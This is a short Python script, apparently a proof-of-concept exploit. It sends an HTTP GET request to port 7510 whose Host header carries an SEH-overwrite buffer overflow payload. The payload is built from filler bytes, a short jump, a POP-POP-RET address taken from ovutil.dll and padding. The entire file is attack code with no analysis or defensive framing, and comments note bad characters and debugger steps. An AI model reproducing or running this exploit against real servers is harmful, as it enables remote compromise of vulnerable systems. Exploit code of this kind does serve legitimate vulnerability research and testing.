#!/usr/bin/python
#EmreOvunc

from socket import socket
from socket import AF_INET
from socket import SOCK_STREAM

#ovutil.dll -> 0x5A 44 74 5F
#POP EBX - POP - RET
seh = "\x5F\x74\x44\x5A"
#Break point -> shift + f9

#Jump over 5 bytes
#JMP SHORT 1035FE3B
#Converting -> jmp = "\xEB\x05\x90\x90" to new jmp
jmp = "\x4C\x4C\x77\x11"
#Jumping address -> 10 35 FE 49

#x90 is in the badchar list.
nops = "D" * 13

bof = "A" * (3381-len(jmp)) + jmp + seh + nops + "C" * (615-len(nops))

request = "GET /topology/homeBaseView HTTP/1.1\r\n"
request += "Host: " + bof + "\r\n"
request += "Content-Type: application/x-www-form-urlencoded\r\n"
request += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
request += "Content-Length: 1048580\r\n\r\n"

expl = socket ( AF_INET, SOCK_STREAM )
expl.connect(("10.10.0.1", 7510))
expl.send(request)
expl.close()
